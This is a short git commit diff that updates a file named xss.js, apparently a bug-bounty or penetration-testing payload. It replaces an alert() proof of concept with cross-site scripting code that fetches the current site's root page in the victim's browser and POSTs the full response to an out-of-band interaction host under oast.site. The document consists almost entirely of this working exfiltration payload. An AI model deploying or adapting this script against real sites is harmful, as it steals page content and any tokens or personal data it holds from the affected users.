77690bb58990182d77b26677c8beb29e41d062eb
MMAKINGDOM <112818014+MMAKINGDOM@users.noreply.github.com>
2025-07-12 05:20:31 +0300

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,1 +1,6 @@
-<script>alert('PoC Al-Muntadhar');</script>
+fetch('/')
+  .then(res => res.text())
+  .then(data => fetch('https://l5f6t7oahsy28wjh61zoo79df5w2ck8gn.oast.site', {
+    method: 'POST',
+    body: data
+  }));
